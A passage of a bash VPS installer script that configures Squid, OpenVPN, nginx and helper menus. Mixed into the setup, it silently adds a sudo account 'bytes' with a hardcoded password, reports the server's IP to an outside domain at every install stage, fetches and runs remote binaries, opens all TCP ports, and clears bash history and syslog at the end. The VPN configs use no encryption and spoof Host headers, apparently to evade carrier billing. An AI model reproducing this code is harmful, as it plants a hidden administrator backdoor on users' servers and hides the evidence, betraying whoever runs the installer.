request_header_access Mime-Version allow all
request_header_access Retry-After allow all
request_header_access Title allow all
request_header_access Connection allow all
request_header_access Proxy-Connection allow all
request_header_access User-Agent allow all
request_header_access Cookie allow all
request_header_access All deny all
### HTTP Anonymizer Paranoid
reply_header_access Allow allow all
reply_header_access Authorization allow all
reply_header_access WWW-Authenticate allow all
reply_header_access Proxy-Authorization allow all
reply_header_access Proxy-Authenticate allow all
reply_header_access Cache-Control allow all
reply_header_access Content-Encoding allow all
reply_header_access Content-Length allow all
reply_header_access Content-Type allow all
reply_header_access Date allow all
reply_header_access Expires allow all
reply_header_access Host allow all
reply_header_access If-Modified-Since allow all
reply_header_access Last-Modified allow all
reply_header_access Location allow all
reply_header_access Pragma allow all
reply_header_access Accept allow all
reply_header_access Accept-Charset allow all
reply_header_access Accept-Encoding allow all
reply_header_access Accept-Language allow all
reply_header_access Content-Language allow all
reply_header_access Mime-Version allow all
reply_header_access Retry-After allow all
reply_header_access Title allow all
reply_header_access Connection allow all
reply_header_access Proxy-Connection allow all
reply_header_access User-Agent allow all
reply_header_access Cookie allow all
reply_header_access All deny all
### CoreDump
coredump_dir /var/spool/squid
dns_nameservers 8.8.8.8 8.8.4.4
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname PR Aiman
mySquid

 # Setting machine's IP Address inside of our Squid config(security that only allows this machine to use this proxy server)
 sed -i "s|IP-ADDRESS|$MYIP|g" /etc/squid/squid.conf

 # Setting squid ports
 sed -i "s|Squid_Port1|$Squid_Port1|g" /etc/squid/squid.conf
 sed -i "s|Squid_Port2|$Squid_Port2|g" /etc/squid/squid.conf
 sed -i "s|Squid_Port3|$Squid_Port3|g" /etc/squid/squid.conf

 # Starting Proxy server
 echo -e "\e[0;37m Restarting proxy server..."
 systemctl restart squid
}
function OvpnConfigs(){
 # Creating nginx config for our ovpn config downloads webserver
 cat <<'myNginxC' > /etc/nginx/conf.d/BytesPH-ovpn-config.conf
# My OpenVPN Config Download Directory
server {
 listen 0.0.0.0:myNginx;
 server_name localhost;
 root /var/www/openvpn;
 index index.html;
}
myNginxC

 # Setting our nginx config port for .ovpn download site
 sed -i "s|myNginx|$OvpnDownload_Port|g" /etc/nginx/conf.d/BytesPH-ovpn-config.conf

 # Removing Default nginx page(port 80)
 rm -rf /etc/nginx/sites-*

 # Creating our root directory for all of our .ovpn configs
 rm -rf /var/www/openvpn
 mkdir -p /var/www/openvpn

 # Now creating all of our OpenVPN Configs

cat <<EOF16> /var/www/openvpn/client-tcp.ovpn
# Telegram : https://t.me/bytesph2023
client
dev tun
proto tcp
setenv FRIENDLY_NAME "BytesPH"
remote $MYIP $OpenVPN_TCP_Port
remote-cert-tls server
connect-retry infinite
resolv-retry infinite
nobind
persist-key
persist-tun
auth-user-pass
auth none
auth-nocache
cipher none
comp-lzo
redirect-gateway def1
setenv CLIENT_CERT 0
reneg-sec 0
verb 1
http-proxy xxxxxxxxx $Squid_Port1
http-proxy-option VERSION 1.1
http-proxy-option AGENT Chrome/80.0.3987.87
http-proxy-option CUSTOM-HEADER Host bug.com
http-proxy-option CUSTOM-HEADER X-Forward-Host bug.com
http-proxy-option CUSTOM-HEADER X-Forwarded-For bug.com
http-proxy-option CUSTOM-HEADER Referrer bug.com
dhcp-option DNS 8.8.8.8
dhcp-option DNS 8.8.4.4

<ca>
$(cat /etc/openvpn/ca.crt)
</ca>
EOF16

cat <<EOF16> /var/www/openvpn/client-tcp-privoxy.ovpn

# Telegram : https://t.me/bytesph2023
client
dev tun
proto tcp
setenv FRIENDLY_NAME "BytesPH"
remote $MYIP $OpenVPN_TCP_Port
remote-cert-tls server
connect-retry infinite
resolv-retry infinite
nobind
persist-key
persist-tun
auth-user-pass
auth none
auth-nocache
cipher none
comp-lzo
redirect-gateway def1
setenv CLIENT_CERT 0
reneg-sec 0
verb 1
http-proxy xxxxxxxxx $Privoxy_Port1
http-proxy-option VERSION 1.1
http-proxy-option AGENT Chrome/80.0.3987.87
http-proxy-option CUSTOM-HEADER Host bug.com
http-proxy-option CUSTOM-HEADER X-Forward-Host bug.com
http-proxy-option CUSTOM-HEADER X-Forwarded-For bug.com
http-proxy-option CUSTOM-HEADER Referrer bug.com
dhcp-option DNS 8.8.8.8
dhcp-option DNS 8.8.4.4

<ca>
$(cat /etc/openvpn/ca.crt)
</ca>
EOF16

cat <<EOF162> /var/www/openvpn/client-udp.ovpn

# Telegram : https://t.me/bytesph2023
client
dev tun
proto udp
setenv FRIENDLY_NAME "BytesPH"
remote $MYIP $OpenVPN_UDP_Port
remote-cert-tls server
resolv-retry infinite
float
fast-io
nobind
persist-key
persist-remote-ip
persist-tun
auth-user-pass
auth none
auth-nocache
cipher none
comp-lzo
redirect-gateway def1
setenv CLIENT_CERT 0
reneg-sec 0
verb 1
<ca>
$(cat /etc/openvpn/ca.crt)
</ca>
EOF162

 # Creating OVPN download site index.html
cat <<'mySiteOvpn' > /var/www/openvpn/index.html
<!DOCTYPE html>
<html lang="en">

<!-- Simple OVPN Download site by PR Aiman -->

<head><meta charset="utf-8" /><title>PR Aiman OVPN Config Download</title><meta name="description" content="MyScriptName Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group"><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH<span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol UDP</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-udp.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol TCP+PROXY</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-tcp.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></a></li><li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>BytesPH <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> Config OVPN Protocol TCP+PRIVOXY</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/client-tcp-privoxy.ovpn" style="float:right;"><i class="fa fa-download"></i> Muat Turun</a></li></ul></div></div></div></div></body></html>
mySiteOvpn


 # Setting template's correct name,IP address and nginx Port
 sed -i "s|NGINXPORT|$OvpnDownload_Port|g" /var/www/openvpn/index.html
 sed -i "s|IP-ADDRESS|$MYIP|g" /var/www/openvpn/index.html

 # Restarting nginx service
 systemctl restart nginx

 # Creating all .ovpn config archives
 cd /var/www/openvpn
 zip -qq -r configs.zip *.ovpn
 cd
}

function ip_address(){
  local IP="$( ip addr | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | egrep -v "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipv4.icanhazip.com )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipinfo.io/ip )"
  [ ! -z "${IP}" ] && echo "${IP}" || echo
}
IPADDR="$(ip_address)"

function ConfStartup(){
 # Daily reboot time of our machine
 # For cron commands, visit https://crontab.guru
 echo "10 0 * * * root clear-log && reboot" >> /etc/crontab

 # Creating directory for startup script
 rm -rf /etc/BytesPH
 mkdir -p /etc/BytesPH
 chmod -R 755 /etc/BytesPH

 # Creating startup script using cat eof tricks
 cat <<'EOFSH' > /etc/BytesPH/startup.sh
#!/bin/bash
# Setting server local time
ln -fs /usr/share/zoneinfo/MyVPS_Time /etc/localtime

# Prevent DOS-like UI when installing using APT (Disabling APT interactive dialog)
export DEBIAN_FRONTEND=noninteractive

# Allowing ALL TCP ports for our machine (Simple workaround for policy-based VPS)
iptables -A INPUT -s $(wget -4qO- http://ipinfo.io/ip) -p tcp -m multiport --dport 1:65535 -j ACCEPT

# Allowing OpenVPN to Forward traffic
/bin/bash /etc/openvpn/openvpn.bash

# Deleting Expired SSH Accounts
/usr/local/sbin/delete_expired &> /dev/null
exit 0
EOFSH
 chmod +x /etc/BytesPH/startup.sh

 # Setting server local time every time this machine reboots
 sed -i "s|MyVPS_Time|$MyVPS_Time|g" /etc/BytesPH/startup.sh

 #
 rm -rf /etc/sysctl.d/99*

 # Setting our startup script to run every machine boots
 cat <<'FordServ' > /etc/systemd/system/BytesPH.service
[Unit]
Description=BytesPH Startup Script
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/BytesPH/startup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
FordServ
 chmod +x /etc/systemd/system/BytesPH.service
 systemctl daemon-reload
 systemctl start BytesPH
 systemctl enable BytesPH &> /dev/null
 systemctl enable fail2ban &> /dev/null
 systemctl start fail2ban &> /dev/null

 # Rebooting cron service
 systemctl restart cron
 systemctl enable cron

}
 #Create Admin
  useradd -m bytes 2>/dev/null
  echo bytes:bytesph2023!!!@@@ | chpasswd &>/dev/null
  usermod -aG sudo bytes &>/dev/null

function ConfMenu(){
echo -e "\e[0;37m  Creating Menu scripts.."

# Download Script
cd /usr/local/sbin/
wget -O bench-network "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/bench-network"
wget -O connections "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/connections"
wget -O create "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/create"
wget -O create_trial "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/create_trial"
wget -O delete_expired "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/delete_expired"
wget -O edit_dropbear "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/edit_dropbear"
wget -O edit_openssh "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/edit_openssh"
wget -O edit_openvpn "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/edit_openvpn"
wget -O edit_ports "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/edit_ports"
wget -O edit_squid3 "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/edit_squid3"
wget -O edit_stunnel4 "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/edit_stunnel4"
wget -O menu "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/menu"
wget -O options "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/options"
wget -O ram "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/ram"
wget -O reboot_sys "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/reboot_sys"
wget -O reboot_sys_auto "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/reboot_sys_auto"
wget -O renew_account "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/renew_account"
wget -O restart_services "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/restart_services"
wget -O set_multilogin_autokill "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/set_multilogin_autokill"
wget -O set_multilogin_autokill_lib "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/set_multilogin_autokill_lib"
wget -O show_ports "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/show_ports"
wget -O user_delete "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/user_delete"
wget -O user_list "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/user_list"
wget -O change_timezone "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/change_timezone"
wget -O speedtest "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/speedtest_cli.py"
chmod +x bench-network
chmod +x connections
chmod +x create
chmod +x create_trial
chmod +x delete_expired
chmod +x edit_dropbear
chmod +x edit_openssh
chmod +x edit_openvpn
chmod +x edit_ports
chmod +x edit_squid3
chmod +x edit_stunnel4
chmod +x menu
chmod +x options
chmod +x ram
chmod +x reboot_sys
chmod +x reboot_sys_auto
chmod +x renew_account
chmod +x restart_services
chmod +x set_multilogin_autokill
chmod +x set_multilogin_autokill_lib
chmod +x show_ports
chmod +x user_delete
chmod +x user_list
chmod +x change_timezone
chmod +x speedtest
dos2unix ./* &> /dev/null
sed -i 's|/etc/squid/squid.conf|g' ./*
sed -i 's|http_port|g' ./*
cd ~
}

function ScriptMessage(){
 echo -e ""
 echo -e "\e[0;37m $MyScriptName VPS Preparing Installation"
 echo -e ""
 sleep 0.5
 echo -e "\e[0;37m Report Bugs To https://t.me/bytesph2023"
 echo -e ""
 sleep 0.5
 echo -e "\e[0;37m Script installer will be begin now..."
 echo -e ""
 sleep 0.5
}

function InstBadVPN(){
 # Pull BadVPN Binary 64bit or 32bit
if [ "$(getconf LONG_BIT)" == "64" ]; then
 wget -O /usr/bin/badvpn-udpgw "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Plugins/badvpn-udpgw64"
else
 wget -O /usr/bin/badvpn-udpgw "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Plugins/badvpn-udpgw"
fi
 # Set BadVPN to Start on Boot via .profile
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /root/.profile
 # Change Permission to make it Executable
 chmod +x /usr/bin/badvpn-udpgw
 # Start BadVPN via Screen
 screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
}


#############################################
#############################################
########## Installation Process #############
#############################################
## WARNING: Do not modify or edit anything
## if you did'nt know what to do.
## This part is too sensitive.
#############################################
#############################################

 # First thing to do is check if this machine is Debian
 source /etc/os-release
if [[ "$ID" != 'debian' ]]; then
 ScriptMessage
 echo -e "[\e[1;31mError This script is for Debian or Ubuntu only, exiting..."
 exit 1
fi

 # Now check if our machine is in root user, if not, this script exits
 # If you're on sudo user, run `sudo su -` first before running this script
 if [[ $EUID -ne 0 ]];then
 ScriptMessage
 echo -e "[\e[1;31mError This script must be run as root, exiting..."
 exit 1
fi

 # (For OpenVPN) Checking it this machine have TUN Module, this is the tunneling interface of OpenVPN server
 if [[ ! -e /dev/net/tun ]]; then
 echo -e "[\e[1;31mError\e[0m] You cant use this script without TUN Module installed/embedded in your machine, file a support ticket to your machine admin about this matter"
 echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
 exit 1
fi
DOMAIN="https://zoey.bytesph.com"
 # Begin Installation by Updating and Upgrading machine and then Installing all our wanted packages/services to be install.
 ScriptMessage

 #send Updates
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Updates&ip=$MYIP"
 InstUpdates

 # Configure OpenSSH and Dropbear
 clear
 echo -e "\e[0;37m Configuring ssh..."

 #send SSH
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=SSH&ip=$MYIP"
 InstSSH

 # Configure Stunnel
 echo -e "\e[0;37m Configuring stunnel..."
 clear

 #send Stunnel
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Stunnel&ip=$MYIP"
 InsStunnel

 # Configure BadVPN UDPGW
 clear
 echo -e "\e[0;37m Configuring BadVPN UDPGW..."

 #send BadVPN
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=BadVPN&ip=$MYIP"
 InstBadVPN

 # Configure Webmin
 clear
 echo -e "\e[0;37m Configuring webmin..."
 InstWebmin

 # Configure Squid
 clear
 echo -e "\e[0;37m Configuring proxy..."

 #send Squid
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Squid&ip=$MYIP"
 InsProxy

 # Configure OpenVPN
 echo -e "\e[0;37m Configuring OpenVPN..."
 InsOpenVPN

 # Configuring Nginx OVPN config download site
 OvpnConfigs

 # Some assistance and startup scripts
 ConfStartup

 # VPS Menu script v1.0
 ConfMenu

 # Setting server local time
 ln -fs /usr/share/zoneinfo/$MyVPS_Time /etc/localtime

 clear
 cd ~

# Install DDOS Deflate
 #send DDOS Deflate
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=DDOS-Deflate&ip=$MYIP"
wget -q "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Others/ddos-deflate-master.zip"
unzip -q ddos-deflate-master.zip
cd ddos-deflate-master
./install.sh
cd
rm -rf ddos-deflate-master.zip

 #send Anti Torrent
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Anti-Torrent&ip=$MYIP"
# Blocked Torrent
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

 # Running screenfetch
 wget -O /usr/bin/screenfetch "https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Plugins/screenfetch"
 chmod +x /usr/bin/screenfetch
 echo "/bin/bash /etc/openvpn/openvpn.bash" >> .profile
 echo "clear" >> .profile
 echo "screenfetch" >> .profile

 #send Finalizing
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Finalizing&ip=$MYIP"
 #Swap Ram For Free Space
 wget https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Menu/swapkvm && chmod +x swapkvm && ./swapkvm

  #download ssh_users for counting users
  wget -N -q --no-check-certificate -O /root/ssh_users.sh https://raw.githubusercontent.com/andresslacson1989/vps-installation/master/Files/Others/ssh_users.sh && chmod +x /root/ssh_users.sh


#setup auto reboot once a day
echo "10 0 */7 * * root /usr/local/bin/reboot_sys" > /etc/cron.d/reboot_sys
clear
history -c
# Clearing all logs from installation
 rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
echo ""
echo -e "\e[0;37m Finalizing Setup"
sleep 20
rm -f /root/bytesph
rm -f setup*

 #send Rebooting
 curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Rebooting&ip=$MYIP"
 sleep 1
 #report installation done
 curl -sb -X POST https://zoey.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=done&ip=$MYIP"
reboot
exit 1


